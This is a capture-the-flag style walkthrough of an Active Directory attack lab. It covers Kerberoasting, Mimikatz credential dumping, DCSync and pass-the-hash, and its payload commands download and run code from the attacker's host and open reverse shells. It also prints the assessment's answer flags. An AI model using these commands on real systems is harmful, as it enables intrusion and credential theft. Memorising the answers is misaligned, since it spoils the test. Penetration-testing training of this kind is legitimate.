# AD Enumeration & Attacks — Skills Assessment Part I

## Scenario
External pentest handoff. Teammate found a file upload vuln on the web server and left a password-protected web shell at `/uploads`. Goal: leverage the foothold to enumerate and compromise the AD domain.

---

## Attack Chain Summary

```
Web Shell → Reverse Shell → Kerberoasting → Lateral Movement → Credential Hunting → DCSync → Domain Compromise
```

---

## Q1 — Flag on WEB01 (Administrator Desktop)

**Access the web shell:**
```
http://<TARGET_IP>/uploads/
Credentials: admin:My_W3bsH3ll_P@ssw0rd!
```

**Situational awareness:**
```powershell
whoami
whoami /priv
hostname
ipconfig /all
systeminfo
```

**Grab the flag:**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

**Answer:** `JusT_g3tt1ng_st@rt3d!`

---

## Q2 — Kerberoastable Account (SPN: MSSQLSvc/SQL01.inlanefreight.local:1433)

### What is Kerberoasting?
Kerberoasting targets service accounts with SPNs (Service Principal Names). Any domain user can request a TGS (Ticket Granting Service) ticket for any SPN. The ticket is encrypted with the service account's NTLM hash — if the password is weak, it can be cracked offline.

### Steps

**Option A — Reverse shell via Meterpreter:**
```bash
# On Pwnbox: generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PWNBOX_IP> LPORT=4444 -f exe -o payload.exe

# Host it
python3 -m http.server 8000

# Start handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <PWNBOX_IP>
set LPORT 4444
exploit
```

**Download and execute from web shell:**
```cmd
curl http://<PWNBOX_IP>:8000/payload.exe -O C:\Windows\System32\payload.exe
C:\Windows\System32\payload.exe
```

**Option B — Base64 encoded PowerShell reverse shell:**
```bash
# Generate on Pwnbox
echo -n '$client = New-Object System.Net.Sockets.TCPClient("<PWNBOX_IP>",4444);...' | iconv -t UTF-16LE | base64 -w 0
```
```cmd
powershell -nop -enc <BASE64_STRING>
```

**Enumerate SPNs:**
```powershell
setspn -Q */*
```

**Answer:** `svc_sql`

---

## Q3 — Crack the Service Account Password

### Pull the Kerberos TGS Hash

**Host Invoke-Kerberoast on Pwnbox:**
```bash
locate Invoke-Kerberoast.ps1
cp $(locate Invoke-Kerberoast.ps1 | head -1) /tmp/
cd /tmp && python3 -m http.server 8080
```

**From the target (web shell or reverse shell):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<PWNBOX_IP>:8080/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

**Alternative — PowerView:**
```powershell
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

### Crack with Hashcat
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# With rules if plain wordlist fails:
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
```

### Crack with John
```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Answer:** `lucky7`

---

## Q4 — Flag on MS01 (Administrator Desktop)

### Lateral Movement with Service Account Creds

**Map a drive to MS01 using the cracked creds:**
```cmd
net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
type \\MS01\c$\Users\Administrator\Desktop\flag.txt
```

**Alternative — From Pwnbox:**
```bash
evil-winrm -i <MS01_IP> -u svc_sql -p 'lucky7'
# or
impacket-psexec inlanefreight.local/svc_sql:'lucky7'@<MS01_IP>
```

**Answer:** `spn$r0ast1ng_on@n_0p3n_f1re`

---

## Q5 & Q6 — Cleartext Credentials via Mimikatz on MS01

### What is Mimikatz?
Mimikatz is a post-exploitation tool that extracts credentials from Windows memory (LSASS process). It can dump plaintext passwords, NTLM hashes, Kerberos tickets, and perform attacks like DCSync and Pass-the-Hash.

### Steps

**Set up port forwarding for RDP to MS01 (from web shell on WEB01):**
```cmd
netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=<WEB01_IP> connectport=3389 connectaddress=172.16.6.50
```

**RDP from Pwnbox:**
```bash
xfreerdp /u:svc_sql /p:lucky7 /v:<WEB01_IP>:8888 /dynamic-resolution /drive:Shared,/home/<USER>/
```

**Upload and run Mimikatz:**
```cmd
copy \\tsclient\Shared\mimikatz.exe C:\Users\Public\mimikatz.exe
C:\Users\Public\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**If passwords show blank — enable WDigest:**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
```

Then RDP back in and run Mimikatz again.

**Q5 Answer:** `tpetty`
**Q6 Answer:** `Sup3rS3cur3D0m@inU2eR`

---

## Q7 — What Attack Can tpetty Perform?

### Enumerate ACLs with PowerView
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Look for: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` = **DCSync**

**Answer:** `DCSync`

---

## Q8 — Domain Compromise (Flag on DC01)

### What is DCSync?
DCSync abuses the Active Directory replication protocol. A user with `Replicating Directory Changes` + `Replicating Directory Changes All` permissions can impersonate a Domain Controller and request password hashes for any account — including the built-in Administrator.

### Steps

**Run as tpetty (from MS01 RDP session):**
```cmd
runas /user:INLANEFREIGHT\tpetty powershell.exe
# Enter password: Sup3rS3cur3D0m@inU2eR
```

**DCSync with Mimikatz:**
```cmd
C:\Users\Public\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

**Copy the NTLM hash** from the output.

### Pivot to DC01

**Set up routing via Meterpreter (if using Meterpreter on MS01):**
```bash
# In meterpreter session
run autoroute -s 172.16.6.3
portfwd add -l 6666 -p 5985 -r 172.16.6.3
```

**Alternative — Port forward via netsh on WEB01:**
```cmd
netsh.exe interface portproxy add v4tov4 listenport=6666 listenaddress=<WEB01_IP> connectport=5985 connectaddress=172.16.6.3
```

**Evil-WinRM with Pass-the-Hash:**
```bash
evil-winrm -i 127.0.0.1 --port 6666 -u administrator -H 27dedb1dab4d8545c6e1c66fba077da0
```

**Grab the flag:**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

**Answer:** `r3plicat1on_m@st3r!`

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| **msfvenom** | Generate reverse shell payloads (exe, dll, ps1, etc.) |
| **Metasploit** | Exploit framework, handler for reverse shells, pivoting (autoroute, portfwd) |
| **setspn** | Windows built-in to query Service Principal Names in AD |
| **Invoke-Kerberoast** | PowerShell script to request and extract TGS hashes for offline cracking |
| **PowerView** | PowerShell AD enumeration framework (users, ACLs, SPNs, trusts) |
| **hashcat** | GPU-accelerated password cracker (mode 13100 for Kerberos TGS) |
| **john** | CPU password cracker (format krb5tgs for Kerberos TGS) |
| **Mimikatz** | Windows credential extraction (logonpasswords, DCSync, Pass-the-Hash) |
| **Evil-WinRM** | Remote shell over WinRM (port 5985) — supports Pass-the-Hash with -H flag |
| **netsh portproxy** | Windows built-in port forwarding for pivoting through compromised hosts |
| **certutil** | Windows built-in for file transfers (download files from HTTP) |
| **xfreerdp** | Linux RDP client with drive sharing (/drive:) for easy tool upload |

---

## Key Concepts

### Kerberoasting
- Any domain user can request a TGS ticket for any SPN
- The ticket is encrypted with the service account's password hash
- Weak passwords can be cracked offline — no lockout, no detection
- **Mitigation:** Use long, complex passwords (25+ chars) for service accounts, use gMSA

### WDigest Authentication
- Legacy Windows auth protocol that stores plaintext creds in LSASS memory
- Disabled by default on Windows 8.1+ / Server 2012 R2+
- Can be re-enabled via registry key (requires admin + reboot)
- **Key:** `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1`

### DCSync Attack
- Abuses AD replication protocol (DRS_REPLICATION)
- Requires: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` permissions
- Can dump any domain account's NTLM hash without touching LSASS
- **Mitigation:** Audit who has replication rights, remove unnecessary permissions

### Pass-the-Hash (PtH)
- Use an NTLM hash directly for authentication without knowing the plaintext
- Works with tools like Evil-WinRM, psexec, wmiexec, smbclient
- **Mitigation:** Disable NTLM where possible, use Credential Guard

### Port Forwarding / Pivoting
- Use compromised hosts as stepping stones to reach internal networks
- `netsh portproxy` — Windows built-in, no tools needed
- Meterpreter `portfwd` and `autoroute` — for routing through sessions
- Essential when internal hosts (MS01, DC01) aren't directly reachable


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[36-beyond-this-module]] | [[skills-assessment-part2]] →
<!-- AUTO-LINKS-END -->
